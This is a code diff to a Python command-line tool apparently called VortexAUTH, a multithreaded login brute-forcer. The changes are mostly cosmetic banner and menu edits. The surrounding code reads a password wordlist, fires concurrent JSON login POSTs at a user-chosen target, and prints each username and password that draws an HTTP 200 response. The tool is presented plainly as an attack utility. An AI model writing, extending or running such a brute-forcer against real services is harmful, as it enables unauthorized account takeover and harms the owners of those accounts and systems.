@@ -7,16 +7,18 @@ from concurrent.futures import ThreadPoolExecutor
 MAX_THREADS = 10
 print_lock = threading.Lock()
 
-def print_banner():
-    GRN, BLU, RST = '\033[92m', '\033[94m', '\033[0m'
-    banner = r"""
-  _   _   ____  ____  _____  _   _  ____  
- ( )_( )(  _ \(  _ \(  _  )( \( )( ___)
-  ) _ (  )   / )   / )(_)(  )  (  )__) 
- (_) (_)(_)\_)(_)\_)(_____)(_)\_)(____)
-  VORTEX v1.1 // BY NEUROPRASS
-    """
-    print(BLU + banner + GRN + "\n [ Focus: Speed & Power ]" + RST)
+def display_banner():
+    print("\033[H\033[J", end="")
+    print("\033[1;34m" + "="*90)
+    print("  ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗ █████╗ ██╗   ██╗████████╗██╗  ██╗")
+    print("  ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║")
+    print("  ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝ ███████║██║   ██║   ██║   ███████║")
+    print("  ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗ ██╔══██║██║   ██║   ██║   ██╔══██║")
+    print("   ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗██║  ██║╚██████╔╝   ██║   ██║  ██║")
+    print("    ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝")
+    print("\n" + " "*28 + "VortexAUTH v1.1 // BY NEUROPRASSSSS")
+    print("="*90 + "\033[0m")
+    print("\033[92m [ Focus: Speed & Power ]\033[0m\n")
 
 def analyze_mechanism(url):
     print(f"\n[*] Probing: {url}")
@@ -33,7 +35,6 @@ def send_request(target_api, username, password):
     payload = json.dumps({"username": username, "password": password})
     try:
         response = requests.post(target_api, headers=headers, data=payload, timeout=5)
-        
         with print_lock:
             if response.status_code == 200:
                 print(f"\033[92m[+] SUCCESS: {username}:{password}\033[0m")
@@ -54,16 +55,15 @@ def execute_test(target_url, username, password_file):
         return
 
     print(f"[*] Starting engine with {len(passwords)} keys using {MAX_THREADS} threads...")
-    
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
         for password in passwords:
             executor.submit(send_request, target_url, username, password)
     input("\n[ Scan completed. Press Enter to return to menu ]")
 
 def main():
-    print_banner()
     while True:
-        print("\n[ CORE MENU ]\n1. Analyze\n2. Run Test\n3. Exit")
+        display_banner()
+        print("[ CORE MENU ]\n1. Analyze\n2. Run Test\n3. Exit")
         choice = input("\nvortex-auth > ")
         if choice == "1":
             url = input("[?] Target URL: ")
@@ -74,6 +74,7 @@ def main():
             pfile = input("[?] Wordlist: ")
             execute_test(url, user, pfile)
         elif choice == "3":
+            print("\n[*] Terminating session...")
             sys.exit()
 
 if __name__ == "__main__":
